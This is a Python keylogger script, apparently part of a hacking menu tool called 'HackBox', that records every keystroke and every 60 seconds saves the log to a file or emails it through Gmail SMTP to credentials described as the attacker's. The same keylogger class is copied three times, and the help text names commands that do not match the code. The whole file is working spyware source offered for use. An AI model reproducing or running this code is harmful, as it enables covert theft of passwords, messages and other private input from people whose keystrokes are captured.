## not my tool, created by thepythoncode.com, author x4nth055 on GitHib

import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
## Enter credentials at line 246

print(r"""

 _   __ _______   __  _     _____ _____ _____  ___________   __   _____ 
| | / /|  ___\ \ / / | |   |  _  |  __ \  __ \|  ___| ___ \ /  | |  _  |
| |/ / | |__  \ V /  | |   | | | | |  \/ |  \/| |__ | |_/ / `| | | |/' |
|    \ |  __|  \ /   | |   | | | | | __| | __ |  __||    /   | | |  /| |
| |\  \| |___  | |   | |___\ \_/ / |_\ \ |_\ \| |___| |\ \  _| |_\ |_/ /
\_| \_/\____/  \_/   \_____/\___/ \____/\____/\____/\_| \_| \___(_)___/ 
                                                                        
                                                                        
                                                           
                """)

print('KEYLOGGER! It logs keys. Type "help" for Help, or "start" to start logging')

statement = input("").lower()

while True:
    if statement == 'start':
        print('starting...')
        class Keylogger:
            def __init__(self, interval, report_method="email"):
                # we gonna pass SEND_REPORT_EVERY to interval
                self.interval = interval
                self.report_method = report_method
                # this is the string variable that contains the log of all 
                # the keystrokes within `self.interval`
                self.log = ""
                # record start & end datetimes
                self.start_dt = datetime.now()
                self.end_dt = datetime.now()

            def callback(self, event):
                """
                This callback is invoked whenever a keyboard event is occured
                (i.e when a key is released in this example)
                """
                name = event.name
                if len(name) > 1:
                    # not a character, special key (e.g ctrl, alt, etc.)
                    # uppercase with []
                    if name == "space":
                        # " " instead of "space"
                        name = " "
                    elif name == "enter":
                        # add a new line whenever an ENTER is pressed
                        name = "[ENTER]\n"
                    elif name == "decimal":
                        name = "."
                    else:
                        # replace spaces with underscores
                        name = name.replace(" ", "_")
                        name = f"[{name.upper()}]"
                # finally, add the key name to our global `self.log` variable
                self.log += name
            
            def update_filename(self):
                # construct the filename to be identified by start & end datetimes
                start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
                end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
                self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

            def report_to_file(self):
                """This method creates a log file in the current directory that contains
                the current keylogs in the `self.log` variable"""
                # open the file in write mode (create it)
                with open(f"Modules/programs/keylogger/logs/{self.filename}.txt", "w") as f:
                    # write the keylogs to the file
                    print(self.log, file=f)
                print(f"[+] Saved Modules/programs/keylogger/logs/{self.filename}.txt")

            def sendmail(self, email, password, message):
                # manages a connection to an SMTP server
                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
                # connect to the SMTP server as TLS mode ( for security )
                server.starttls()
                # login to the email account
                server.login(email, password)
                # send the actual message
                server.sendmail(email, email, message)
                # terminates the session
                server.quit()

            def report(self):
                """
                This function gets called every `self.interval`
                It basically sends keylogs and resets `self.log` variable
                """
                if self.log:
                    # if there is something in log, report it
                    self.end_dt = datetime.now()
                    # update `self.filename`
                    self.update_filename()
                    if self.report_method == "email":
                        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                    elif self.report_method == "file":
                        self.report_to_file()
                    # if you want to print in the console, uncomment below line
                    # print(f"[{self.filename}] - {self.log}")
                    self.start_dt = datetime.now()
                self.log = ""
                timer = Timer(interval=self.interval, function=self.report)
                # set the thread as daemon (dies when main thread die)
                timer.daemon = True
                # start the timer
                timer.start()

            def start(self):
                # record the start datetime
                self.start_dt = datetime.now()
                # start the keylogger
                keyboard.on_release(callback=self.callback)
                # start reporting the keylogs
                self.report()
                # block the current thread, wait until CTRL+C is pressed
                keyboard.wait()

            
        if __name__ == "__main__":
            # if you want a keylogger to send to your email
            # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
            # if you want a keylogger to record keylogs to a local file 
            # (and then send it using your favorite method)
            keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="{}".format(statement))
            keylogger.start()
    if statement == 'start -f':
        print('starting...')
        class Keylogger:
            def __init__(self, interval, report_method="email"):
                # we gonna pass SEND_REPORT_EVERY to interval
                self.interval = interval
                self.report_method = report_method
                # this is the string variable that contains the log of all 
                # the keystrokes within `self.interval`
                self.log = ""
                # record start & end datetimes
                self.start_dt = datetime.now()
                self.end_dt = datetime.now()

            def callback(self, event):
                """
                This callback is invoked whenever a keyboard event is occured
                (i.e when a key is released in this example)
                """
                name = event.name
                if len(name) > 1:
                    # not a character, special key (e.g ctrl, alt, etc.)
                    # uppercase with []
                    if name == "space":
                        # " " instead of "space"
                        name = " "
                    elif name == "enter":
                        # add a new line whenever an ENTER is pressed
                        name = "[ENTER]\n"
                    elif name == "decimal":
                        name = "."
                    else:
                        # replace spaces with underscores
                        name = name.replace(" ", "_")
                        name = f"[{name.upper()}]"
                # finally, add the key name to our global `self.log` variable
                self.log += name
            
            def update_filename(self):
                # construct the filename to be identified by start & end datetimes
                start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
                end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
                self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

            def report_to_file(self):
                """This method creates a log file in the current directory that contains
                the current keylogs in the `self.log` variable"""
                # open the file in write mode (create it)
                with open(f"Modules/programs/keylogger/logs/{self.filename}.txt", "w") as f:
                    # write the keylogs to the file
                    print(self.log, file=f)
                print(f"[+] Saved Modules/programs/keylogger/logs/{self.filename}.txt")

            def sendmail(self, email, password, message):
                # manages a connection to an SMTP server
                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
                # connect to the SMTP server as TLS mode ( for security )
                server.starttls()
                # login to the email account
                server.login(email, password)
                # send the actual message
                server.sendmail(email, email, message)
                # terminates the session
                server.quit()

            def report(self):
                """
                This function gets called every `self.interval`
                It basically sends keylogs and resets `self.log` variable
                """
                if self.log:
                    # if there is something in log, report it
                    self.end_dt = datetime.now()
                    # update `self.filename`
                    self.update_filename()
                    if self.report_method == "email":
                        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                    elif self.report_method == "file":
                        self.report_to_file()
                    # if you want to print in the console, uncomment below line
                    # print(f"[{self.filename}] - {self.log}")
                    self.start_dt = datetime.now()
                self.log = ""
                timer = Timer(interval=self.interval, function=self.report)
                # set the thread as daemon (dies when main thread die)
                timer.daemon = True
                # start the timer
                timer.start()

            def start(self):
                # record the start datetime
                self.start_dt = datetime.now()
                # start the keylogger
                keyboard.on_release(callback=self.callback)
                # start reporting the keylogs
                self.report()
                # block the current thread, wait until CTRL+C is pressed
                keyboard.wait()

            
        if __name__ == "__main__":
            # if you want a keylogger to send to your email
            # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
            # if you want a keylogger to record keylogs to a local file 
            # (and then send it using your favorite method)
            keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
            keylogger.start()
    if statement == 'start -e':
## ---- ENTER CREDENTIALS HERE ---- ##
        EMAIL_ADDRESS = "EMAIL" ## make sure to turn on 'allow less secure app access' on the attackers end
        EMAIL_PASSWORD = "PASSWORD"
        print ('starting...')
        class Keylogger:
            def __init__(self, interval, report_method="email"):
                # we gonna pass SEND_REPORT_EVERY to interval
                self.interval = interval
                self.report_method = report_method
                # this is the string variable that contains the log of all 
                # the keystrokes within `self.interval`
                self.log = ""
                # record start & end datetimes
                self.start_dt = datetime.now()
                self.end_dt = datetime.now()

            def callback(self, event):
                """
                This callback is invoked whenever a keyboard event is occured
                (i.e when a key is released in this example)
                """
                name = event.name
                if len(name) > 1:
                    # not a character, special key (e.g ctrl, alt, etc.)
                    # uppercase with []
                    if name == "space":
                        # " " instead of "space"
                        name = " "
                    elif name == "enter":
                        # add a new line whenever an ENTER is pressed
                        name = "[ENTER]\n"
                    elif name == "decimal":
                        name = "."
                    else:
                        # replace spaces with underscores
                        name = name.replace(" ", "_")
                        name = f"[{name.upper()}]"
                # finally, add the key name to our global `self.log` variable
                self.log += name
            
            def update_filename(self):
                # construct the filename to be identified by start & end datetimes
                start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
                end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
                self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

            def report_to_file(self):
                """This method creates a log file in the current directory that contains
                the current keylogs in the `self.log` variable"""
                # open the file in write mode (create it)
                with open(f"Modules/programs/keylogger/logs/{self.filename}.txt", "w") as f:
                    # write the keylogs to the file
                    print(self.log, file=f)
                print(f"[+] Saved Modules/programs/keylogger/logs/{self.filename}.txt")

            def sendmail(self, email, password, message):
                # manages a connection to an SMTP server
                server = smtplib.SMTP(host="smtp.gmail.com", port=587)
                # connect to the SMTP server as TLS mode ( for security )
                server.starttls()
                # login to the email account
                server.login(email, password)
                # send the actual message
                server.sendmail(email, email, message)
                # terminates the session
                server.quit()

            def report(self):
                """
                This function gets called every `self.interval`
                It basically sends keylogs and resets `self.log` variable
                """
                if self.log:
                    # if there is something in log, report it
                    self.end_dt = datetime.now()
                    # update `self.filename`
                    self.update_filename()
                    if self.report_method == "email":
                        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                    elif self.report_method == "file":
                        self.report_to_file()
                    # if you want to print in the console, uncomment below line
                    # print(f"[{self.filename}] - {self.log}")
                    self.start_dt = datetime.now()
                self.log = ""
                timer = Timer(interval=self.interval, function=self.report)
                # set the thread as daemon (dies when main thread die)
                timer.daemon = True
                # start the timer
                timer.start()

            def start(self):
                # record the start datetime
                self.start_dt = datetime.now()
                # start the keylogger
                keyboard.on_release(callback=self.callback)
                # start reporting the keylogs
                self.report()
                # block the current thread, wait until CTRL+C is pressed
                keyboard.wait()

            
        if __name__ == "__main__":
            # if you want a keylogger to send to your email
            # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
            # if you want a keylogger to record keylogs to a local file 
            # (and then send it using your favorite method)
            keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
            keylogger.start()

            
        

    elif statement == 'help':
        print("-----------------------------------------------------------------")
        print(" --- General Config ---")
        print('')
        print("'start': Runs the keylogger")
        print("'file': Runs the keylogger, saves to file (under log folder in keylogger folder)")
        print("'email': Runs the keylogger, sends to email (configure on line 246 in keylogger file)")        
        print('')
        print(" --- ######## ---")
        print('')
        print("'exit': exits back to HackBox'")
        print("-----------------------------------------------------------------")
    elif statement == 'exit':
        print('KEYLOGGER: Exiting KEYLOGGER')
        
        exec(open('HackBox.py').read()) 
    else:
        print('KEYLOGGER: Invalid Paramater, type help for help, or exit to exit')

    statement = input("").lower()